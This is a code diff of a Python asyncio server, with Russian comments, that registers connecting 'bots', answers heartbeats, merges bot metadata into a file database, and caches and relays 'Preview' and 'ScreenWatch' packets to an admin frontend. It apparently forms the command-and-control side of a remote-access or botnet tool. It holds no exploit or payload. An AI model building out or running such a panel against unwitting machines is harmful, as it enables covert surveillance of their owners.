@@ -12,17 +12,16 @@ from backend.BenchUtils import add_bytes
 from backend.API import manager
 from backend.API.protocols import pack_bot_command
 
-class BotConnectionHandler:
-    """Обработка жизненного цикла и протокола обмена с ботами"""
+# Кэш последних превью в оперативной памяти {client_id: full_packet_bytes}
+preview_cache = {}
 
+class BotConnectionHandler:
     async def handle_new_connection(self, reader, writer):
-        """Входная точка для каждого нового TCP соединения"""
         client_id = None
         ip_addr = writer.get_extra_info("peername")[0]
         self._set_tcp_nodelay(writer)
 
         try:
-            # 1. Авторизация и первичная склейка
             auth = await authorize_client(reader, ip_addr)
             if not auth:
                 return await self._force_close(writer)
@@ -30,7 +29,6 @@ class BotConnectionHandler:
             client_id, bot_data = auth
             await self._register_bot(client_id, bot_data, writer, reader)
 
-            # 2. Цикл приема пакетов
             while True:
                 packet = await self._read_packet(reader)
                 if not packet:
@@ -43,57 +41,65 @@ class BotConnectionHandler:
             await self._disconnect_bot(client_id, writer)
 
     async def _register_bot(self, cid, data, writer, reader):
-        """Регистрация бота в системе и уведомление фронтенда"""
         if cid in active_clients:
             await close_client(cid, send_sleep=False)
         
         active_clients[cid] = (reader, writer)
         data['status'] = 'online'
         
+        # 1. Отправляем в таблицу полные данные из БД
         pkt = pack_bot_command(cid, "DataScribe", json.dumps([data]))
         manager.broadcast_packet_sync(pkt)
+        
+        # 2. Если в RAM есть старое превью — сразу пушим его админу
+        if cid in preview_cache:
+            manager.broadcast_packet_sync(preview_cache[cid])
+            
         logger.info(f"[+] Бот {cid} подключен")
 
     async def _process_packet(self, cid, writer, packet):
-        """Разбор пакета: только то, что нужно серверу, остальное — в менеджер"""
         try:
             id_len, mod_len = packet[0], packet[1]
             module = packet[6 + id_len : 6 + id_len + mod_len].decode('utf-8', errors='ignore')
 
-            # 1. Снимаем метрики трафика
             add_bytes(len(packet))
 
-            # 2. Только системные модули для логики сервера
-            if module == "DataScribe":
-                return await self._handle_datascribe(cid, packet)
-            
+            # Логика Heartbeat (Пинг-Понг)
             if module == "Heartbeat":
                 return await self._handle_heartbeat(cid, writer)
 
-            # 3. ВСЕ ОСТАЛЬНОЕ (Preview, ScreenWatch, FileData и т.д.) 
-            # Просто пробрасываем админу без лишних вопросов
+            # Логика Таблицы (Событийное обновление окна/времени)
+            if module == "DataScribe":
+                return await self._handle_datascribe(cid, packet)
+
+            # Логика Превью (Кэширование в RAM и проброс)
+            if module == "Preview":
+                preview_cache[cid] = packet # Сохраняем в память
+                return manager.broadcast_packet_sync(packet)
+
+            # Все остальные модули (ScreenWatch и т.д.) — просто транзит
             manager.broadcast_packet_sync(packet)
 
         except Exception as e:
             logger.error(f"Packet Error [{cid}]: {e}")
 
     async def _handle_datascribe(self, cid, packet):
-        """Вскрытие JSON, мерж с БД и отправка склеенного статуса"""
+        """Мерж данных и обновление таблицы фронтенда"""
         id_len, mod_len = packet[0], packet[1]
         payload = packet[6 + id_len + mod_len:]
         try:
-            data = json.loads(payload.decode('utf-8'))
-            if isinstance(data, dict):
-                full_data = sync_bot_data(cid, data)
-                full_data['status'] = 'online'
-                
-                clean_pkt = pack_bot_command(cid, "DataScribe", json.dumps([full_data]))
-                manager.broadcast_packet_sync(clean_pkt)
-                add_bytes(len(packet))
-        except: pass
+            new_data = json.loads(payload.decode('utf-8'))
+            # sync_bot_data обновит Bots_DB.txt и вернет полный объект бота
+            full_data = sync_bot_data(cid, new_data)
+            full_data['status'] = 'online'
+            
+            # Важно: упаковываем в список [full_data], так как фронт ждет массив для таблицы
+            clean_pkt = pack_bot_command(cid, "DataScribe", json.dumps([full_data]))
+            manager.broadcast_packet_sync(clean_pkt)
+        except Exception as e:
+            logger.error(f"DataScribe Sync Error: {e}")
 
     async def _handle_heartbeat(self, cid, writer):
-        """Автоматический ответ на пинг бота"""
         pong = pack_bot_command(cid, "Heartbeat", "pong")
         writer.write(pong)
         await writer.drain()
